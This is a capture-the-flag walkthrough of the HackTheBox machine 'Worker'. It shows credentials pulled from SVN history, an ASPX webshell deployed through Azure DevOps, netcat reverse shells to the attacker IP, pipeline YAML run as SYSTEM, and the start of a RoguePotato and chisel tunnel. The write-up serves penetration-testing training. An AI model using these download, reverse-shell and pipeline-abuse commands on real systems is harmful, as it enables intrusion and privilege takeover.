---
title: HTB: Worker
url: https://0xdf.gitlab.io/2021/01/30/htb-worker.html
date: 2021-01-30T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: htb-worker, hackthebox, ctf, svn, credentials, password-reuse, vhosts, wfuzz, azure, azure-devops, burp, devops, pipeline, git, webshell, upload, aspx, evil-winrm, azure-pipelines, potato, roguepotato, juicypotato, chisel, socat, tunnel, cicd, htb-sizzle, htb-json, oscp-like-v2
---

![Worker](https://0xdfimages.gitlab.io/img/worker-cover.png)

Worker is all about exploiting an Azure DevOps environment. I’ll find creds in an old SVN repository and use them to get into the Azure DevOps control panel where several websites are managed. I’ll upload a webshell into one of the sites and rebuild it, gaining execution and a shell. With the shell I’ll find creds for another user, and use that to get back into Azure DevOps, this time as someone with permission to create pipelines, which I’ll use to get a shell as System. In Beyond Root, I’ll show RoguePotato, as this was one of the first vulnerable boxes to release after that came out.

## Box Info

| Name | [Worker](https://hackthebox.com/machines/worker)  [Worker](https://hackthebox.com/machines/worker) [Play on HackTheBox](https://hackthebox.com/machines/worker) |
| --- | --- |
| Release Date | [15 Aug 2020](https://twitter.com/hackthebox_eu/status/1293994493428015104) |
| Retire Date | 30 Jan 2021 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Worker |
| Radar Graph | Radar chart for Worker |
| First Blood User | 01:29:58[haqpl haqpl](https://app.hackthebox.com/users/76469) |
| First Blood Root | 03:10:42[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creator | [ekenas ekenas](https://app.hackthebox.com/users/222808) |

## Recon

### nmap

`nmap` found three open TCP ports, HTTP (80), SVN (3690), and WinRM (5985):

```

root@kali# nmap -p- --min-rate 1000 -oA scans/nmap-alltcp-slow 10.10.10.203
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 10:43 EDT
Nmap scan report for worker.htb (10.10.10.203)
Host is up (0.016s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3690/tcp open  svn
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds

root@kali# nmap -p 80,3690,5985 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.203
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 11:46 EDT
Nmap scan report for worker.htb (10.10.10.203)
Host is up (0.013s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows 10 / Server 2016 / Server 2019.

### SVN - TCP 3690

#### checkout

I’m much more comfortable with Git as opposed to Subversion, but I found this [cheat sheet](http://www.gcf.dkf.unibe.ch/BCB/files/BCB_Subversion_Cheat_Sheet.pdf) helpful. First , I used `checkout` to get a local copy of the repo from the server with `svn checkout svn://10.10.10.203`. There’s a directory for dimension and a text file, along side the `.svn` directory which stores history (just like `.git` does for Git):

```

root@kali# ls -la
total 13
drwxrwx--- 1 root vboxsf    0 Aug 21 13:08 .
drwxrwx--- 1 root vboxsf 4096 Aug 21 13:07 ..
drwxrwx--- 1 root vboxsf 4096 Aug 21 13:08 dimension.worker.htb
-rwxrwx--- 1 root vboxsf  162 Aug 21 13:08 moved.txt
drwxrwx--- 1 root vboxsf 4096 Aug 21 13:07 .svn

```

#### Files

`moved.txt` claims that this repo is not longer updated, and has moved to the devops subdomain:

```

This repository has been migrated and will no longer be maintained here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)

```

`dimension.worker.htb` has what looks like the static files associated with the site:

```

root@kali# ls dimension.worker.htb/
assets  images  index.html  LICENSE.txt  README.txt

```

There’s not much exciting here to find.

#### log

Subversion gives a log of the commit history:

```

root@kali# svn log
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line
-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------

```

I’m immediately drawn to `r2`, where a deployment script is added. That seems like the kind of thing that might have creds in it, especially since it’s been removed.

#### Walk Revisions

For the sake of completeness, I started with `r1`:

```

root@kali# svn up -r1
Updating '.':
D    moved.txt
Updated to revision 1.

```

The `D` means that file was deleted, in comparison with what I had. A quick look through the files confirms that none of the other files changed.

Moving to `r2`, the file `deploy.ps1` is added (`A`):

```

root@kali# svn up -r2
Updating '.':                                                                     
A    deploy.ps1                                                                   
Updated to revision 2. 

```

The file just starts another script as the user nathen, including hard coded creds:

```

$user = "nathen"                                                                  
$plain = "wendel98"                    
$pwd = ($plain | ConvertTo-SecureString)                                          
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"                                                           
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")

```

`r3` updates (`U`) the script:

```

root@kali# svn up -r3
Updating '.':
U    deploy.ps1                                                                   
Updated to revision 3.

```

Now the password is gone:

```

$user = "nathen"                                                                  
# NOTE: We cant have my password here!!!                                          
$plain = ""                                                                       
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")

```

`r4` removes the script all together, and `r5` adds the note:

```

root@kali# svn up -r4
Updating '.':
D    deploy.ps1
Updated to revision 4.
root@kali# svn up -r5                         
Updating '.':
A    moved.txt
Updated to revision 5.

```

### Website - TCP 80

The site is the default IIS page:

![image-20200820204515730](https://0xdfimages.gitlab.io/img/image-20200820204515730.png)

I tried to run `gobuster` against the site, but it didn’t find anything and kept errroring out.

The HTTP headers show it’s running ASP.NET (so `.aspx` pages):

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Sat, 28 Mar 2020 13:58:44 GMT
Accept-Ranges: bytes
ETag: "f29ff7fe85d61:0"
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Content-Length: 703

```

### VHost Fuzzing

Given the multiple references to `worker.htb` subdomains (`devops` and `dimension`) observed in SVN, I’ll use `wfuzz` to look for others:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.203 -H 'Host: FUZZ.worker.htb' --hh 703
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.203/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                             
===================================================================

000000296:   200        170 L    542 W    6495 Ch     "alpha"
000007691:   200        355 L    1408 W   16045 Ch    "story"
000022566:   401        85 L     329 W    20028 Ch    "devops"
000023339:   200        397 L    1274 W   14803 Ch    "cartoon"
000023462:   200        111 L    398 W    4971 Ch     "lens"
000024714:   200        368 L    1173 W   14588 Ch    "dimension"
000037212:   400        6 L      26 W     334 Ch      "*"
000071250:   200        274 L    871 W    10134 Ch    "twenty"

Total time: 788.1111
Processed Requests: 100000
Filtered Requests: 99992
Requests/sec.: 126.8856

```

It crashed a few times, but eventually got it to run all the way through. I’ll add all of these to my `/etc/hosts` file:

```
10.10.10.203 worker.htb alpha.worker.htb story.worker.htb devops.worker.htb cartoon.worker.htb lens.worker.htb dimension.worker.htb twenty.worker.htb

```

### devops.worker.htb - TCP 80

I spent a some time looking at each of the sites. devops.worker.htb just pops an auth prompt. I thought at first that it was basic auth, but it is actually NTLM auth, which will matter later. If I give no creds, it does provide an interesting error page:

![image-20200822210940519](https://0xdfimages.gitlab.io/img/image-20200822210940519.png)

This must be an instance of Azure DevOps.

### dimension.worker.htb - TCP 80

dimension.worker.htb seems to be the site that ties the others together:

![image-20200821125356347](https://0xdfimages.gitlab.io/img/image-20200821125356347.png)

The Intro and About pages are the same, and each provides a link to the Work page, which contains links to the other subdomains:

![image-20200821125446426](https://0xdfimages.gitlab.io/img/image-20200821125446426.png)

In addition to the domains I already added, I’ll add two more subdomains to `/etc/hosts`:

```

solid-state.worker.htb spectral.worker.htb

```

At this point I found SVN open, and decided to come back to the websites after looking there.

## Shell as iis

### Enumerate devops.worker.htb

#### Access

Going back to devops.worker.htb, I can use the creds from SNV to log in. There is one catch - it won’t work with Burp on in the default configuration. Because it’s using NTLM authentication, Burp breaks it. I showed why in [Beyond Root for Sizzle](/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth). There’s two ways around this. First, I can just disable Burp. I don’t need it to continue here.

Still, it’s useful to know how to get the tools to work for you, and QTC (who happened to earn root blood on Worker) provided that on Twitter:

> The problem is that NTLM authenticates the TCP connection, which is not kept alive when using a proxy. However, you can still use Burp:  
>   
> 1. Proxy -> Options -> uncheck "Set Connection Close"  
> 2. User Options -> Platform Authentication -> Add NTLM  
>   
> Also works on community :)
>
> — Tobias Neitzel (@qtc\_de) [August 21, 2020](https://twitter.com/qtc_de/status/1296925229189603328?ref_src=twsrc%5Etfw)

I configured my Burp Community that way it worked flawlessly.

#### Repos

On accessing the page now, I’m at an instance of Azure DevOps:

[![image-20200822063505111](https://0xdfimages.gitlab.io/img/image-20200822063505111.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200822063505111.png)

If I click into the SmartHotel360 project, and then on the Repos option from the menu on the left side, it will load the SmartHotel360 repo:

[![image-20200822063719038](https://0xdfimages.gitlab.io/img/image-20200822063719038.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200822063719038.png)

At the top, I’ll noticed that there’s a drop down by the SmartHotel360 repo, and clicking on it, shows the other repos that are available in this project:

![image-20200822063806216](https://0xdfimages.gitlab.io/img/image-20200822063806216.png)

These are the sites I found during enumeration.

#### Pipelines

The other menu option on the left to check out is Pipelines:

[![image-20200822064131729](https://0xdfimages.gitlab.io/img/image-20200822064131729.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200822064131729.png)

I haven’t used Azure DevOps before, but this is very similar to Gitlab CICD (which I use to build this site each time I push a new commit to master) or GitHub Actions. For each of the sites, there’s a pipeline, which is a series of commands to run, presumably to build the updated site and deploy it.

Clicking view on the pipeline presents the details:

[![image-20200822064437637](https://0xdfimages.gitlab.io/img/image-20200822064437637.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200822064437637.png)

I can click View YAML to see it in that form:

```

steps:
- task: CopyFiles@2
  displayName: 'Deploy web site'
  inputs:
    SourceFolder: '$(Build.SourcesDirectory)'
    Contents: |
     **
     !.git/**/*
    TargetFolder: 'w:\sites\$(Build.Repository.Name).worker.htb'
    CleanTargetFolder: true
    OverWrite: true
  timeoutInMinutes: 5

```

This task takes the files from the sources folder and writes them into the destination folder (presumably where they are hosted by IIS).

One thing that’s interesting is the target folder of `w:\sites\...`. I’ll keep an eye out for that when I get a shell.

I don’t have permissions to change any of the pipelines, or to create a new one.

Clicking the Run or Queue buttons pop a form:

![image-20200822064653909](https://0xdfimages.gitlab.io/img/image-20200822064653909.png)

Looks like I do have permissions to start a build, which means if I can change a site in the repo here, I can use the pipeline to push that change to the hosted site.

### Upload Webshell

#### Failed Upload to Master

I first tried to just upload a file by picking one of the repos (in this case alpha) clicking the Upload file(s) button:

[![image-20200822211959449](https://0xdfimages.gitlab.io/img/image-20200822211959449.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200822211959449.png)

It pops a form where I can select a basic ASPX webshell, but I got an error that I can’t upload in the master branch:

![image-20200822065232643](https://0xdfimages.gitlab.io/img/image-20200822065232643.png)

In Git, the main or default name for a branch is master. Then users can create other branches based on another branch, and people can make different changes in each branch. The idea is that eventually you merge other branches back into master, and Git helps manage getting all the changes together, or helping you resolve conflicts.

It is not uncommon to have lower access users able to create and save (commit) into branches that are not master while limiting access to master, and typically, only master would have a pipeline that pushed actual content to the site.

#### Create a Branch / Upload

I’ll click on the dropdown by the branch selection. There’s currently only master, but also an option to add a new one:

![image-20200822212052513](https://0xdfimages.gitlab.io/img/image-20200822212052513.png)

Clicking New branch pops a form that I’ll fill in:

![image-20200822212122281](https://0xdfimages.gitlab.io/img/image-20200822212122281.png)

Now I can select Upload file(s) again, and this time my upload (from `/usr/share/webshells/aspx/` on Kali) succeeds:

![image-20200822212258393](https://0xdfimages.gitlab.io/img/image-20200822212258393.png)

I’m choosing an ASPX webshell because of the `X-Powered-By: ASP.NET` header seen during Recon.

#### Deploy

Now back in Pipelines, I’ll select the CICD job for the project I uploaded into (Alpha), and run the build job, giving it the branch I created:

![image-20200822212414083](https://0xdfimages.gitlab.io/img/image-20200822212414083.png)

About 30 seconds later the job completes and the shell is there:

![image-20200822094517569](https://0xdfimages.gitlab.io/img/image-20200822094517569.png)

And it has execution:

![image-20200822212520948](https://0xdfimages.gitlab.io/img/image-20200822212520948.png)

### Shell

I’ll start a local Python webserver and then upload `nc64.exe` using the following command: `powershell -c wget 10.10.14.24/nc64.exe -outfile \programdata\nc.exe`.

Now I’ll get a shell by running `\programdata\nc.exe -e cmd.exe 10.10.14.24 443`:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.203.
Ncat: Connection from 10.10.10.203:49987.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

## Priv: iis –> robisl

### Enumeration

Before uploading an enumeration script like [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), I always explore the system a bit. No interesting directories at the root of C. Two potential users on the box, restorer and robisl:

```

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of c:\Users

2020-07-07  17:53    <DIR>          .
2020-07-07  17:53    <DIR>          ..
2020-03-28  15:59    <DIR>          .NET v4.5
2020-03-28  15:59    <DIR>          .NET v4.5 Classic
2020-07-22  01:02    <DIR>          Administrator
2020-03-28  15:01    <DIR>          Public
2020-07-22  01:11    <DIR>          restorer
2020-07-08  19:22    <DIR>          robisl
               0 File(s)              0 bytes
               8 Dir(s)  10420121600 bytes free

```

I also wanted to see if the reference from the Azure DevOps pipeline to `W:` was legit. I could just try navigating into it, but there are also a few ways to list all the drives on the host. `wmic` is a nice way, and it shows there is in fact a `W:`:

```

c:\Users>wmic logicaldisk get deviceid, volumename, description
Description       DeviceID  VolumeName  
Local Fixed Disk  C:                    
Local Fixed Disk  W:        Work

```

PowerShell can do it too:

```

c:\Users>powershell -c get-psdrive -psprovider filesystem

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
C                  19,69          9,70 FileSystem    C:\                                                          Users
W                   2,52         17,48 FileSystem    W:\

```

Having confirmed it exists, I’ll jump into `W:` and check it out:

```

c:\Users>w:

W:\>dir
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\

2020-06-16  18:59    <DIR>          agents
2020-03-28  15:57    <DIR>          AzureDevOpsData
2020-04-03  11:31    <DIR>          sites
2020-06-20  16:04    <DIR>          svnrepos
               0 File(s)              0 bytes
               4 Dir(s)  18764595200 bytes free

```

The `sites` directory has a folder for each site, and these appear to be the where the sites are hosted from:

```

W:\sites>dir
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\sites

2020-04-03  11:31    <DIR>          .
2020-04-03  11:31    <DIR>          ..
2020-08-23  03:26    <DIR>          alpha.worker.htb
2020-07-20  23:43    <DIR>          cartoon.worker.htb
2020-04-03  12:27    <DIR>          dimension.worker.htb
2020-07-20  23:43    <DIR>          lens.worker.htb
2020-07-20  23:43    <DIR>          solid-state.worker.htb
2020-08-03  12:33    <DIR>          spectral.worker.htb
2020-07-20  23:43    <DIR>          story.worker.htb
2020-07-20  23:43    <DIR>          twenty.worker.htb
               0 File(s)              0 bytes
              10 Dir(s)  18764595200 bytes free
              
W:\sites>dir alpha.worker.htb
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\sites\alpha.worker.htb

2020-08-23  03:26    <DIR>          .
2020-08-23  03:26    <DIR>          ..
2020-08-23  03:26    <DIR>          assets
2020-08-23  03:26             1442 cmdasp.aspx
2020-08-23  03:26             3707 contact.html
2020-08-23  03:26            19755 elements.html
2020-08-23  03:26             4742 generic.html
2020-08-23  03:26    <DIR>          images
2020-08-23  03:26             6495 index.html
2020-08-23  03:26            17128 LICENSE.txt
2020-08-23  03:26             1050 README.txt
               7 File(s)         54319 bytes
               4 Dir(s)  18764595200 bytes free

```

The webshell is sitting in the root of the alpha directory, and there’s no version control (Git or Subversion) folder present - The pipeline simply copied the files it was given into this directory.

`AzureDevOpsData` and `agents` seem to have to do with the CICD deployment. What’s interesting is the `svnrepos`. Presumably this is legacy Subversion server from before the move to Azure DevOps.

```

W:\svnrepos\www>dir
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\svnrepos\www

2020-06-20  11:29    <DIR>          .
2020-06-20  11:29    <DIR>          ..
2020-06-20  15:30    <DIR>          conf
2020-06-20  15:52    <DIR>          db
2020-06-20  11:29                 2 format
2020-06-20  11:29    <DIR>          hooks
2020-06-20  11:29    <DIR>          locks
2020-06-20  11:29               251 README.txt
               2 File(s)            253 bytes
               6 Dir(s)  18764595200 bytes free

W:\svnrepos\www>type README.txt
This is a Subversion repository; use the 'svnadmin' and 'svnlook' 
tools to examine it.  Do not add, delete, or modify files here 
unless you know how to avoid corrupting the repository.

Visit http://subversion.apache.org/ for more information.

```

In the `conf` directory, both `authz` and `passwd` jump out as interesting:

```

W:\svnrepos\www\conf>dir
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\svnrepos\www\conf

2020-06-20  15:30    <DIR>          .
2020-06-20  15:30    <DIR>          ..
2020-06-20  11:29             1112 authz
2020-06-20  11:29               904 hooks-env.tmpl
2020-06-20  15:27             1031 passwd
2020-04-04  20:51             4454 svnserve.conf
               4 File(s)          7501 bytes
               2 Dir(s)  18764595200 bytes free

```

`authz` is all default stuff (every line is commented), but `passwd` provides plaintext passwords for a long list of users:

```

W:\svnrepos\www\conf>type passwd
type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday

```

nathen’s password matches what I used to get into Azure DevOps. robisl (one of the users with a home directory from above) is on the list with the password “wolves11”. robisl is also in the “Remote Management Users” group:

```

W:\svnrepos\www\conf>net user robisl
net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-03 12:41:02

Logon hours allowed          All

Local Group Memberships      *Production           *Remote Management Use
Global Group memberships     *None                 
The command completed successfully.

```

That means robisl can connect over WinRM.

### EvilWinRM

If robisl reuses this password from SVN on the box, [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) should provide a shell. It does:

```

root@kali# evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\robisl\Documents>

```

And with this shell I can claim `user.txt`:

```
*Evil-WinRM* PS C:\Users\robisl\desktop> type user.txt
c236e29b************************

```

## Priv: robisl –> system

### Enumeration

I didn’t find much in the way of privesc on the box from robisl. Eventually I decided to see if robisl could log into Azure DevOps, and it worked, and provided a different project:

![image-20200823054235776](https://0xdfimages.gitlab.io/img/image-20200823054235776.png)

This project only has one repo (unlike the previous which has one for each site). It has a lot of files, but nothing that seemed of interest:

[![image-20200823054407822](https://0xdfimages.gitlab.io/img/image-20200823054407822.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200823054407822.png)

In Project settings under General -> Security, robisl is a Build Administrator:

[![image-20200823054513354](https://0xdfimages.gitlab.io/img/image-20200823054513354.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200823054513354.png)

This group can [define builds with CI](https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) and other pipeline related tasks.

### Create Pipeline

Under Pipelines, I’ll click the New pipeline button, which starts down a series of forms to create a pipeline. First, I need to select a repo:

![image-20200823055309287](https://0xdfimages.gitlab.io/img/image-20200823055309287.png)

I’ll select Azure Repos Git, and then select PartsUnlimited from the list:

![image-20200823055342822](https://0xdfimages.gitlab.io/img/image-20200823055342822.png)

In the next step, I’m to select the kind of project this will be. There are a ton of options:

[![image-20200823060418297](https://0xdfimages.gitlab.io/img/image-20200823060418297.png)](https://0xdfimages.gitlab.io/img/image-20200823060418297.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200823060418297.png)

I selected Starter Pipeline as it seemed the simplest.

The next window presents a YAML file that defines the pipeline using various keywords:

![image-20200823060557541](https://0xdfimages.gitlab.io/img/image-20200823060557541.png)

`trigger` will define when this runs. In this default case, the pipeline will run on commits (or merges) to master. I will see that robisl doesn’t have permission to commit to master, but saving will also run the pipeline, so I don’t really care about the trigger.

`pool` define how the pipeline runs. My first instinct was to just leave this the same.

`steps` defines the various scripts that will run and in order. A `script` can be on line, or in YAML `|` indicates a [multiline string](https://yaml-multiline.info/) keeping newlines until the next item based on indent.

### Troubleshoot Template

It’s always a good idea when starting with someone else’s code to just run it and make sure it works. Without this, if it fails later I won’t know if it was my changes or the original template. When I click Save and run, it pops a dialog about committing this file:

![image-20200823062901328](https://0xdfimages.gitlab.io/img/image-20200823062901328.png)

Clicking Save and run again pops an error because robisl can’t commit to master:

![image-20200823062936300](https://0xdfimages.gitlab.io/img/image-20200823062936300.png)

I’ll select Create a new branch… and name it 0xdf. It creates the pipeline, but then it fails:

![image-20200823063243612](https://0xdfimages.gitlab.io/img/image-20200823063243612.png)

It is failing because there is not pool named `Default`. I don’t have permissions to Authorize resources. The short solution here is to just remove this line from the config, and then it will run with the organization default pool. However, I can also find the real name for the available pools by clicking on the Azure DevOps logo on the top left, and then Collection Settings at the bottom left. On the left side, there’s a menu for Agent pools:

![image-20200823063814740](https://0xdfimages.gitlab.io/img/image-20200823063814740.png)

There’s a pool called Setup.

### Pipeline Hello World

I’ll go back to Pipelines for PartsUnlimited and start a new pipeline. At the config, I’ll name the pool `Setup`, Save and run. I’ll have to either delete the branch 0xdf and the pull request, or just use a different branch name. This time it runs. The various stages show live on screen, and when it’s done, it displays the summary:

![image-20200823064131923](https://0xdfimages.gitlab.io/img/image-20200823064131923.png)

My input defined two steps, “Run a one-line script” and “Run a multi-line script”, and they are both there. Clicking on Run a one-line script shows the results:

[![image-20200823064458383](https://0xdfimages.gitlab.io/img/image-20200823064458383.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200823064458383.png)

On line 14 is the output of the script. Clicking Next task shows similar output for the second stage, Run a multi-line script:

[![image-20200823064559895](https://0xdfimages.gitlab.io/img/image-20200823064559895.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200823064559895.png)

The two `echo` statements are executed.

### Read root.txt

The next thing I want to do is determine which user is running the scripts. I’ll cheat a bit and also attempt to read `root.txt`:

```

trigger:
- master

pool: 'Setup'

steps:
- script: |
    whoami
    type c:\users\administrator\desktop\root.txt
  displayName: 'Pwn all the things'

```

The results show that it runs as nt authority\system! And it returns the flag:

[![image-20200823065122408](https://0xdfimages.gitlab.io/img/image-20200823065122408.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200823065122408.png)

### Shell

Of course I want a shell, so I’ll create another pipeline:

```

trigger:
- master

pool: 'Setup'

steps:
- script: c:\programdata\nc.exe -e cmd 10.10.14.24 443
  displayName: 'shellz'

```

The job will hang when it gets to the stage shellz:

![image-20200823065409269](https://0xdfimages.gitlab.io/img/image-20200823065409269.png)

Over at my `nc` listener, I have a shell as system:

```

root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.203.
Ncat: Connection from 10.10.10.203:54104.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

W:\agents\agent11\_work\13\s>whoami
nt authority\system

```

## Beyond Root - RoguePotato

### Enumeration

In my first shell, the IIS user has `SeImpersonatePrivilege`:

```

c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Up until Server 2019, this would be a great scenario for [JuicyPotato](https://github.com/decoder-it/juicy-potato). But Microsoft made changes that broke JuicyPotato.

This box is running Windows Server 2019:

```

c:\windows\system32\inetsrv>systeminfo
                                                                                             
Host Name:                 WORKER                                                                                                                                                          
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
...[snip]...

```

In May 2020, [@splinter\_code](https://twitter.com/splinter_code) and [@decoder\_it](https://twitter.com/decoder_it) released RoguePotato:

> No more JuicyPotato? Old story, welcome RoguePotato!  
> Checkout our blog post by [@decoder\_it](https://twitter.com/decoder_it?ref_src=twsrc%5Etfw) and me.<https://t.co/9lH6MdVjsb>
>
> — Antonio Cocomazzi (@splinter\_code) [May 11, 2020](https://twitter.com/splinter_code/status/1259862885112729601?ref_src=twsrc%5Etfw)

[The blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) provides a ton of detail. But the TL;DR is that I can still go from `SeImpersonatePrivlege` to system. I did a blog post showing [RoguePotato on Remote](/2020/09/08/roguepotato-on-remote.html) last September, but this was the first box I actually had used it on.

### What’s New In Rogue?

Part of the Potato attack is to send a request to the OXID Resolver which runs as part of the `rpcss` service and listens on TCP 135. Prior to Windows 10 1809 / Server 2019, the invoker could specify that they wante to actually contact the OXID Resolver on a different port, which allows earlier Potatoes like JuicyPotato to set up a fake OXID Resolver and handle that request. That’s what the `-l` parameter is - What port should the fake OXID Resolver listen on. For example, from my [writeup for Json](/2020/02/15/htb-json.html#priv-3-userpool--system), I’m telling the fake OXID Resolver to listen on localhost:9001:

![image-20210129104048450](https://0xdfimages.gitlab.io/img/image-20210129104048450.png)

Now in modern Windows OXID Resolutions can only happen on TCP 135, and the legit service is already running there. But the resolution is not limited to the local machines. So now I pass RoguePotato my IP, and it will send the OXID Resolver request to that IP on TCP 135. I have two options to handle this. The simplest is to use something like `socat` to tunnel that request right back to the Windows host where RoguePotato is listening. If the box where RoguePotato is run is blocking in bound connections or can’t be reached like that, the RP repo also has an exe that can be run on a machine I control.

![image-20210129110002264](https://0xdfimages.gitlab.io/img/image-20210129110002264.png)

Either way, RoguePotato is able to get the request to the Fake OXID Resolver on TCP 135.

### Initial Attempt

I’ll grab a copy of the release binary from [GitHub](https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip), and upload it to Worker using a local Python webserver and PowerShell:

```

c:\ProgramData>powershell -c wget http://10.10.14.24/RoguePotato.exe -outfile RoguePotato.exe

```

There’s a problem here. The firewall is blocking all inbound tcp ports except for the three identified during the initial `nmap`. RoguePotato needs to have a listening port such that the connection to TCP 135 on my host is tunneled back to the target host on that port.

### Tunnel

Rather than mess with the Fake OXID exe, I’ll create the tunnel myself with [Chisel](https://github.com/jpillora/chisel). I’ll start the server locally, and then upload the exe to Worker and connect as a client:

```

c:\ProgramData>.\c client 10.10.14.24:8000 R:9999:localhost:9999
